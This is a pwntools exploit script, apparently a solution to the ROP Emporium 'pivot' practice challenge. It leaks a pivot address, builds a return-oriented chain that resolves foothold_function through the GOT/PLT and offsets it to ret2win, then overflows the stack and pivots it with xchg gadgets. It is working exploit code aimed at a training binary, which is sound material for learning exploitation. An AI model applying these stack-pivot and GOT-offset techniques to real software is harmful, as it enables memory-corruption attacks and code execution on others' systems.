from pwn import *

elf = ELF('./pivot')
r = process("./pivot")

r.recvuntil('pivot: ')
pivot = int(r.recvline().strip(), 16)

pop_rax = 0x00000000004009bb
xchg = 0x00000000004009bd
foot_plt = elf.plt.foothold_function
foot_got = elf.got.foothold_function
put_pls = elf.plt.puts
ret2win = 0x0000000000000a81
foothold_function = 0x000000000000096a
add = ret2win - foothold_function
pop_rbp = 0x00000000004007c8
add_rax_rbp = 0x00000000004009c4
pop_rdi = 0x0000000000400a33
call_rax = 0x00000000004006b0
mov_rax = 0x00000000004009c0




payload = p64(foot_plt)
payload += p64(pop_rax)
payload += p64(foot_got)
payload += p64(mov_rax)
payload += p64(pop_rbp)
payload += p64(add)
payload += p64(add_rax_rbp)
payload += p64(call_rax)
r.sendlineafter("> ", payload)

payload = b'a'*40
payload += p64(pop_rax)
payload += p64(pivot)
payload += p64(xchg)
r.sendlineafter("> ", payload)
r.interactive()